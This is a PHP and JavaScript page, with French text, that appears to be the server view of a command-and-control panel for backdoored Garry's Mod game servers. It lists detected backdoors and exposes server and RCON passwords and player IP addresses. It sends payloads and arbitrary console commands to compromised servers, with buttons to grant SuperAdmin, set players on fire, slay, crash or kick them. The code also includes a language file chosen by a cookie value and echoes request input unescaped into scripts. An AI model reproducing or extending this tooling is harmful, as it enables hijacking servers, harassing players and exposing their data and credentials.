<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
include 'core/class/include.php';
include 'core/langs/' . $_COOKIE["language_w"] . ".php";
$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous �tes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
  }
// Redirige l'utilisateur si il n'est pas autrentifier
if (!Account::isAuthentified())
{
    header('Location: index.php');
    exit();
}
if(!isset($_GET["server"]))
  die("Ce n'est pas un dossier . . .");
$ussssr = Server::GetServer($_GET["server"]);
$admin = IsAdmin($_SESSION["id"]);
if(!IsAdmin($_SESSION["id"], $ussssr["userid"]))
  die("Ce serveur ne t'appartient pas")
?>
    <div class="container-fluid">
        <div class="row-fluid">
        	<style type="text/css">
        		ul li {
        			display: inline;
        		}
        		#serverinfogp li span {
        			color: red;
        		}
        	</style>
          <h1 style="color: #1c1c1c"><?php echo $ussssr["server_name"];?></h1>
          <ul  class="nav py-3" style="justify-content: space-around;">

            <li class="active">
            <a class="btn btn-primary"  href="#1a" data-toggle="tab">Administration</a>
          </li>
          <li><a class="btn btn-secondary" href="#2a" data-toggle="tab"><?php echo $lang["players"]; ?></a>
          </li>
          <li>
          	<a class="btn btn-warning" onclick="showcallPayload(<?php echo $_GET["server"]; ?>)" data-toggle="modal" data-target="#serverpayload-modal" href="#"><?php echo $lang["sendpayload"]; ?></a> 
          </li>

          <li><a class="btn btn-primary" href="#3a" data-toggle="tab">Console</a>
          </li>
          <li><a class="btn btn-secondary" href="#5cc" data-toggle="tab">Addons</a>
          </li>
          <li>
          <a class="btn btn-info" onclick="giveServer(<?php echo $_GET["server"]; ?>)" href="#"><?php echo $lang["giveservers"]; ?></a> 

          </li>

          </ul>
          <div class="tab-content clearfix">
            <div class="tab-pane active" id="1a">
          <div class="panel panel-default">
        <div class="panel-heading"><i class="fa fa-info"></i>&nbsp;Administration</div>
        <div class="panel-body" id="rules-body" style="color:#1c1c1c; background-color: #F8F9FC;">

                <ul class="list-group" id="serverinfogp">
                	<li class="list-group-item">
                		<?php echo $lang["ipaddress"]; ?><br />
                		<span id="server-ip"><?php echo $lang["waitserver"]; ?></span>     <a style="margin-right: 5%;" href="#" id="secoauserver">Se connecter au server</a><br />

                	</li>
                  <li class="list-group-item">
                    Port<br />
                    <span id="server-port"><?php echo $lang['waitserver']; ?></span>
                  </li>
                	<li class="list-group-item">
                		<?php echo $lang["serverpassword"]; ?><br />
                		<span id="server-pw">Le serveur n'a pas de mot de passe</span>
                	</li>
                	<li class="list-group-item">
                		<?php echo $lang["rconpassword"]; ?><br />
                		<span id="server-rcon">Le serveur n'a pas de mot de passe RCON</span>
                	</li>
                	<li class="list-group-item">
                		<?php echo $lang["gamemode"]; ?><br />
                		<span id="server-gm"><?php echo $lang["waitserver"]; ?></span>
                	</li>
                	<li class="list-group-item">
                		<?php echo $lang["map"]; ?><br />
                		<span id="server-map"><?php echo $lang["waitserver"]; ?></span>
                	</li>
					<li class="list-group-item">
                		<?php echo $lang["cac"]; ?><br />
                		<span id="server-cac"><?php echo $lang["waitserver"]; ?></span>
                	</li>
					<li class="list-group-item">
                		<?php echo $lang["snte"]; ?><br />
                		<span id="server-snte"><?php echo $lang["waitserver"]; ?></span>
                	</li>

                </ul>

                <div class="panel panel-default">
        <div class="panel-heading"><i class="fa fa-info"></i>&nbsp;Backdoors</div>
        <div class="panel-body" id="pnlwala-body" style="color:#1c1c1c; background-color: #F8F9FC;">
                <ul class="list-group" id="backdoorsgp">


                </ul>
            </div>
        </div>

       </div>
        </div>
      </div>

      <div  class="tab-pane" id="2a">
      	          <div class="panel panel-default">
        <div class="panel-heading"><i class="fa fa-info"></i>&nbsp;<?php echo $lang["players"]; ?></div>
        <div class="panel-body" id="rules-body" style="color:#1c1c1c; background-color: #F8F9FC;">
 	<ul class="list-group" id="playersrerss">


                </ul>

   </div>
</div>
      </div>
      <div  class="tab-pane" id="5cc">
      	          <div class="panel panel-default">
        <div class="panel-heading"><i class="fa fa-info"></i>&nbsp;Addons</div>
        <div class="panel-body" id="rules-body" style="color:#1c1c1c; background-color: #F8F9FC;">
 	<ul class="list-group" id="addonsgp">


                </ul>

   </div>
</div>
      </div>
      <div class="tab-pane" id="3a">
        <div class="panel panel-default">
        <div class="panel-heading"><i class="fa fa-info"></i>&nbsp;Console</div>
        <div class="panel-body" id="rules-body" style="background-color: #F8F9FC;">
        		<textarea disabled="" id="consollee" rows="20" cols="100">Chargement. . .</textarea>
       </div>
       <div class="panel-footer" id="rules-body" style="background-color: #F8F9FC;">
            <a class="btn btn-secondary btn-sm" onclick="sendCMD(<?php echo $_GET["server"]; ?>)" href="#">Envoyer</a> 

            <textarea id="console_snd" rows="1" cols="100" placeholder="Command a envoyer"></textarea>
       </div>
        </div>
        </div>
    </div>
</div>
<div class="modal fade" id="serverpayload-modal" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title"><?php echo $lang["sendpayload"]; ?></h4>
      </div>
      <div class="modal-body" id="serverpayload-body">
          <div class="form-group">
            <label><?php echo $lang["payload"]; ?></label>
            <select class="form-control" id="server-payload">
            </select>
          </div>
          <div class="form-group">
            <label>Mode d'argument</label>
            <select class="form-control" id="server-payload-arg-mode">
              <option value="texte">Texte</option>
              <optgroup label="Joueurs" id="optgroupplayers">
              </optgroup>
            </select>
          </div>
          <div class="form-group">
            <label>Argument</label>
            <textarea class="form-control" rows="3" id="server-payload-arg" placeholder="Argument du payload"></textarea>
          </div>
      </div>
      <div class="modal-footer" id="serverpayload-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal"><?php echo $lang["cancel"]; ?></button>
        <button type="button" onclick="callPayload()" class="btn btn-primary"><?php echo $lang["sendpayload"]; ?></button>
      </div>
    </div>

  </div>
</div>



<div class="modal fade" id="sendpayload-waiting-modal" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
        <h4><?php echo $lang["waitserver"]; ?></h4>
    </div>
  </div>
</div>

    <script type="text/javascript">
    	function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
 }
    	function decodeHTMLEntities(text) {
    var entities = [
        ['amp', '&'],
        ['apos', '\''],
        ['#x27', '\''],
        ['#x2F', '/'],
        ['#39', '\''],
        ['#47', '/'],
        ['lt', '<'],
        ['gt', '>'],
        ['nbsp', ' '],
        ['quot', '"']
    ];

    for (var i = 0, max = entities.length; i < max; ++i) 
        text = text.replace(new RegExp('&'+entities[i][0]+';', 'g'), entities[i][1]);

    return text;
}
    	setInterval(()=>{
    		$.ajax({
      url: "core/ajax/get-server-console.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
      $("#consollee").val(data);
    });
    $.ajax({
      url: "core/ajax/get-server-info.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
        $("#server-name").text(data.server_name);
        $("#server-ip").text(data.server_ip);
        $("#server-port").text(data.server_port);
        if(data.rcon != "" && data.rcon != "NOT FOUND")
        	$("#server-rcon").text(data.rcon);
        $("#server-gm").text(data.gm);
        $("#server-map").text(data.map);
        if(data.pw != "")
        	$("#server-pw").text(data.pw);
        document.getElementById("secoauserver").href = "steam://connect/" + data.server_ip;
        
        dad = JSON.parse(decodeHTMLEntities(data.additonnals));
        console.log(dad);
        $("#server-cac").text(dad.security.cac);
        $("#server-snte").text(dad.security.snte);
        $("#addonsgp").html("");
        $("#backdoorsgp").html("");
        $.each(dad.backdoors, function(i, item) {
        	$("#backdoorsgp").html($("#backdoorsgp").html() + '<li class="list-group-item"><span class="text-danger">' + escapeHtml(item.net) + '</span><br />' + escapeHtml(item.file) + '<br /><code>' + escapeHtml(item.func) + '</code></li>');
        });
        

        $("#addonsgp").html();
        $.each(dad.addons, function(i, item) {
        	$("#addonsgp").html($("#addonsgp").html() + '<li class="list-group-item">' + escapeHtml(item) + '</li>');
        });
        $("#backdoorsgp").html($("#backdoorsgp").html() + '<li class="list-group-item">GHackDoor <br /><span class="text-danger">' + escapeHtml(dad.infected) + '</span></li>');

    });
    $.ajax({
      url: "core/ajax/get-server-players.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
    	$("#playersrerss").html("");
        $.each(data, function(i, item) {
        	$("#playersrerss").html($("#playersrerss").html() + '<li class="list-group-item"><span class="text-danger">' + escapeHtml(item.name) + '</span> <span class="badge badge-info">' + escapeHtml(item.group) + ' </span><br />' + escapeHtml(item.steamid) + ' <a href="#" onclick="plyActionn(8, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-smile-wink"></i> SuperAdmin</a><a href="#" onclick="plyActionn(126, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-smile-wink"></i> User</a><br /><code>' + escapeHtml(item.ip) + '</code>' +
        		' <a href="#" onclick="plyActionn(104, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-book-dead"></i> DeathNote menu</a>' +
        		' <a href="#" onclick="plyActionn(86, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-fire"></i> Fire</a>' +
        		' <a href="#" onclick="plyActionn(85, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-skull-crossbones"></i> Slay</a>' +
        		' <a href="#" onclick="plyActionn(127, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-skull-smile-wink"></i> Crash</a>' +
        		' <a href="#" onclick="plyActionn(87, \'' + escapeHtml(item.steamid) + '\')"><i class="fa fa-audio"></i> Kick</a></li>');
        });
    });
    	}, 5000);
    	function sendCMD(id) {
        $.ajax({
        url: "core/ajax/call-payload.php?server=" + id + "&payload=110&arg=" + $("#console_snd").val()
      }).done(()=>{
        $("#console_snd").val("")
      });
      }
      function plyActionn(func, ply) {
        $.ajax({
        url: "core/ajax/call-payload.php?server=<?php echo $_GET["server"]; ?>&payload=" + func + "&arg=player.GetBySteamID('" + ply + "')"
      }).done(()=>{
        $("#console_snd").val("")
      });
      }
    </script>




